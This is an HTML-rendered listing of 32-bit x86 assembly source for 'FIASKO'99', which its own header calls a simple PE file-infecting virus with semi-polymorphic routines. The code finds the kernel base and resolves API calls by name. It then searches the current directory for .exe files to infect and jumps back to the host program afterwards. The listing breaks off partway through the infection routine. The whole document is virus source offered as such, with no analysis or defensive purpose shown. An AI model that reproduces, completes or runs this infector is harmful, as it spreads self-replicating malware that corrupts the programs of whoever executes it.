<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>FIASKO.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; comment "</span><span class="sc0">
</span><span class="sc1">; FIASKO'99 created by mort[MATRiX]  </span><span class="sc0">
</span><span class="sc1">;          - simple PE infector with some semi-polymorph rout.</span><span class="sc0">
</span><span class="sc1">;          - TASM rools...</span><span class="sc0">
</span><span class="sc1">;          - try infect 2 files in directory</span><span class="sc0">
</span><span class="sc1">;          - no payload</span><span class="sc0">
</span><span class="sc1">;          - thanx to Lord Julus - i hope there's not to much your code...;)</span><span class="sc0">
</span><span class="sc1">; "</span><span class="sc0">


</span><span class="sc5">_vSize</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">@endOfIT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">@start</span><span class="sc0">
</span><span class="sc5">_hSize</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc0">

</span><span class="sc2">.586</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">     </span><span class="sc5">ExitProcess</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">     </span><span class="sc5">MessageBoxA</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
          
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">@start</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">_hSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">090h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@bleh</span><span class="sc4">:</span><span class="sc0">          
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">sti</span><span class="sc0">
          </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@start</span><span class="sc0">
          </span><span class="sc6">pushfd</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@findKernel</span><span class="sc0">
          </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@nope</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc0">                  </span><span class="sc1">;find GetProcAddress</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;number of names</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;address of funcs</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;address of names</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;address of ordinals</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">@nextName</span><span class="sc4">:</span><span class="sc0">          
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GPA</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_GPASize</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@foundGPA</span><span class="sc0">

          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@nextName</span><span class="sc0">
          
</span><span class="sc5">@foundGPA</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
          </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsw</span><span class="sc0">
          </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
 
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GPAAdd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@infect</span><span class="sc0">

</span><span class="sc5">@nope</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">popfd</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@firstExecution</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00dead00h</span><span class="sc0">          
</span><span class="sc5">_hostIP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@firstExecution</span><span class="sc4">:</span><span class="sc0"> 
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'mort[MATRiX]''s virus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FIASKO''99 - 10x 4 nothing...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------( data )------------</span><span class="sc0">
</span><span class="sc5">_GPA</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GPASize</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_GPA</span><span class="sc0">
</span><span class="sc5">_GPAAdd</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           
</span><span class="sc5">_retAdd</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_mask</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fileHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_mapHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_mapBase</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_fileTime3x</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_newFileSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">_XFindFirstFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        
</span><span class="sc5">_XFindNextFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         
</span><span class="sc5">_XGetCurrentDirectory</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
</span><span class="sc5">_XCreateFileMapping</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    
</span><span class="sc5">_XMapViewOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         
</span><span class="sc5">_XUnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       
</span><span class="sc5">_XGetFileAttributes</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    
</span><span class="sc5">_XSetFileAttributes</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    
</span><span class="sc5">_XCreateFile</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
</span><span class="sc5">_XCloseHandle</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
</span><span class="sc5">_XSetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
</span><span class="sc5">_XSetFilePointer</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        
</span><span class="sc5">_XSetEndOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">_XSetCurrentDirectory</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">max_path</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                  

</span><span class="sc5">filetime</span><span class="sc0">                        </span><span class="sc9">STRUC</span><span class="sc0">             
        </span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
        </span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
</span><span class="sc5">filetime</span><span class="sc0">                        </span><span class="sc9">ENDS</span><span class="sc0">              
                                                  
</span><span class="sc5">fileSearch</span><span class="sc0">                      </span><span class="sc9">STRUC</span><span class="sc0">             
        </span><span class="sc5">FileAttributes</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
        </span><span class="sc5">CreationTime</span><span class="sc0">            </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        
        </span><span class="sc5">LastAccessTime</span><span class="sc0">          </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        
        </span><span class="sc5">LastWriteTime</span><span class="sc0">           </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        
        </span><span class="sc5">FileSizeHigh</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
        </span><span class="sc5">FileSizeLow</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
        </span><span class="sc5">Reserved0</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
        </span><span class="sc5">Reserved1</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              
        </span><span class="sc5">FileName</span><span class="sc0">                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc5">max_path</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">AlternateFileName</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     
                                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      
</span><span class="sc5">fileSearch</span><span class="sc0">                      </span><span class="sc9">ENDS</span><span class="sc0">              
                                                   
</span><span class="sc5">_crtDir</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_fileSearch</span><span class="sc0">         </span><span class="sc5">fileSearch</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------( call kernel API )-------------</span><span class="sc0">
</span><span class="sc5">@cAPI</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_retAdd</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">_kernelBase</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GPAAdd</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_retAdd</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------( find kernel base )---</span><span class="sc0">
</span><span class="sc5">@findKernel</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@delta</span><span class="sc0">
</span><span class="sc5">@delta</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc0">
          </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc0">
</span><span class="sc5">@fKl3</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@fKl1</span><span class="sc0">
</span><span class="sc5">@fKl2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01000h</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@fKl3</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@delta</span><span class="sc0">
          </span><span class="sc6">stc</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@fKl1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@fKl2</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;esi - kernel base</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_kernelBase</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">@delta</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@delta</span><span class="sc0">

          </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;eax - kernel PE</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------( infect )-------------------</span><span class="sc0">
</span><span class="sc5">@infect</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_crtDir</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XGetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

</span><span class="sc5">@nextDir</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XSetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileSearch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_mask</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XFindFirstFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">

          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@eou</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;push handle</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@tryInfect</span><span class="sc0">
          
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_XFindNextFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@cAPI</span><span class="sc0">
          
          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@kdoMaPoradHledatNakyMenaProTyZasranyLabely</span><span class="sc0"> </span><span class="sc1">;czech rules</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@tryInfect</span><span class="sc0">               </span><span class="sc1">;this shit seems to be shortest</span><span class="sc0">

</span><span class="sc5">@kdoMaPoradHledatNakyMenaProTyZasranyLabely</span><span class="sc4">:</span><span class="sc0">          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@eou</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">            
